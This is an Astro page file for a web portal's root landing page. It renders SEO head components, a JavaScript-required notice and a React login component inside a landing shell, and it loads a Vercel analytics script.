---
/**
 * Human landing at `/`. Astro owns the document; one React island owns the login tree.
 * Middleware rewrites `/` → public/index.html after origin → bot → risk → geo.
 */
import "../../app/globals.css"
import "../styles/astro-font.css"
import "../components/error-screen.css"
import SeoHead from "../components/seo-head.astro"
import { SeoJsonLd } from "@/components/seo-json-ld"
import LandingShell from "../components/landing-shell.tsx"
import EbcLoginLanding from "@/components/ebc-login-landing"
import { HERO_IMAGE_SRC as heroImage } from "../lib/brand-images"

export const viewport = { width: "device-width", initialScale: 1 }

const allowLocalTestingEnv = ["1", "true", "yes"].includes(
  (import.meta.env.ALLOW_LOCAL_TESTING ?? "").trim().toLowerCase(),
)
---

<!DOCTYPE html>
<html lang="en-US">
  <head>
    <SeoHead />
    <SeoJsonLd />
    <link rel="preload" as="image" href={heroImage} />
  </head>
  <body class="font-sans antialiased">
    <noscript>
          <div style="min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 2rem; font-family: sans-serif; text-align: center; background-color: #f8fafc; color: #0f172a;">
            <h1 style="font-size: 1.5rem; font-weight: 600; margin-bottom: 0.75rem;">JavaScript Required</h1>
            <p style="max-width: 28rem; font-size: 0.95rem; color: #475569; line-height: 1.5;">Please enable JavaScript in your browser settings to access this portal securely.</p>
          </div>
        </noscript>
    <LandingShell client:only="react" allowLocalTestingEnv={allowLocalTestingEnv}>
      <EbcLoginLanding />
    </LandingShell>
    <script src="/_vercel/insights/script.js" is:inline defer></script>
  </body>
</html>
